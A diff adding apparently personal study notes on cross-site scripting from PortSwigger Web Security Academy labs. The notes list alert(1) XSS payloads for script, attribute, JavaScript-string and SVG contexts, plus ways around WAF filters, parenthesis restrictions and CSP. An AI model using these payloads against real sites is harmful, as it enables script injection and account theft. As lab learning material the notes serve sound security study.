@@ -1,0 +1,53 @@
+The reason this works is that the browser first performs HTML parsing to identify the page elements including blocks of script, and only later performs JavaScript parsing to understand and execute the embedded scripts. The above payload leaves the original script broken, with an unterminated string literal. But that doesn't prevent the subsequent script being parsed and executed in the normal way
+
+if waf dosent allow (): One way of doing this is to use the throw statement with an exception handler. This enables you to pass arguments to a function without using parentheses. The following code assigns the alert() function to the global exception handler and the throw statement passes the 1 to the exception handler (in this case alert). The end result is that the alert() function is called with 1 as an argument.
+
+onerror=alert;throw 1
+https://portswigger.net/research/xss-without-parentheses-and-semi-colons
+
+xss using hidden input field: https://portswigger.net/research/xss-in-hidden-input-fields
+
+even if csp is in place there are some usefull techniques in portswigger with dangling markup: gist is: if csp isnt blocking frame and base uri its vunerble if the filters can be bypassed
+https://portswigger.net/web-security/cross-site-scripting/content-security-policy
+
+https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup
+
+
+Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded
+'-alert(1)-'
+
+https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected this was a good one
+payload for this one was: \"} + alert(1)//
+
+Lab: Reflected XSS with some SVG markup allowed
+<svg width="200" height="200">
+  <rect x="10" y="10" width="100" height="100" fill="blue">
+    <animateTransform attributeName="x" from="10" to="150" dur="5s" begin="0s" fill="freeze" 
+             onbegin="console.log('Animation started!')" />
+  </rect>
+</svg>
+
+do this again: lab: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag
+payload: https://0aef006d0472a828811dedef00de0029.web-security-academy.net/?'accesskey='x'onclick='alert(1)
+did it again: " didnt work. it had to be '
+
+</script><script>alert(1)</script>
+
+
+
+Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
+\';alert(1)//
+
+
+
+
+the most beautiful one:
+payload: from html encoded https:');alert(1)//
+real payloa is this: https:&apos;);alert(1)//
+fazit: we can use html encode in js to close js but not to close html
+we can use 
+
+
+payloads:
+<img src=1 oNeRrOr=alert`1`>
+
